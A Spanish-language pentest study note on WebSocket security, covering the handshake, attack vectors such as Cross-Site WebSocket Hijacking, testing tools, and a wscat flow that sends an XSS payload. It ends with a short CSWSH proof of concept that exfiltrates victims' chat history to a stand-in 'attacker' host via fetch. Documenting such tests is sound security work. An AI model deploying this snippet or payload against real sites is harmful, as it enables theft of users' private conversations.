---
aliases:
tags:
  - asset/web-app
kind: Concept
linked:
---
# WebSockets

> [!info]
> Protocolo bidireccional sobre TCP (puerto 80/443) que mantiene conexión persistente cliente-server. Pentest: inspección de mensajes, manipulación inputs, CSWSH, hijacking de sesión.

---

## Handshake básico

```http
GET /chat HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```

Respuesta 101 → conexión upgraded.

---

## Vectores

| Vector | Mecanismo |
|---|---|
| **CSWSH** (Cross-Site WebSocket Hijacking) | WebSocket no valida Origin → atacante abre conexión cross-origin con cookies de víctima |
| **Input injection** | Servers que tratan WS messages como trusted (SQLi, XSS, CMDi via WS) |
| **Auth bypass** | Auth solo verificado en HTTP handshake, NO en cada message |
| **DoS** | Abrir miles de conexiones long-lived |
| **Encoding bypass** | WAF que filtra HTTP no inspecciona payloads WS |

---

## Tools

- **Burp Suite** — proxy nativo soporta WS, repeat/intercept messages
- **wsrepl** (Doyensec) — CLI WS REPL para fuzzing
- **wscat** — cliente WS general

---

## Testing flow

```bash
# 1. wscat connect
wscat -c wss://target.com/chat -H 'Cookie: session=...'

# 2. Send raw frame
> {"type":"message","content":"<script>alert(1)</script>"}

# 3. Burp intercept para tampering interactivo
# Proxy → WebSockets history pane
```

---

## CSWSH PoC

```html
<script>
  ws = new WebSocket('wss://victim.com/chat');
  ws.onopen = () => ws.send('GET_HISTORY');
  ws.onmessage = e => fetch('https://attacker/?d='+btoa(e.data));
</script>
```

Si víctima visita esto autenticada y server no valida Origin → leak conversaciones.

---

## Notas Relacionadas

- [[Session Hijacking]]
- [[Cross-Site Request Forgery (CSRF)]]
- [[Cross-Site Scripting (XSS)]]
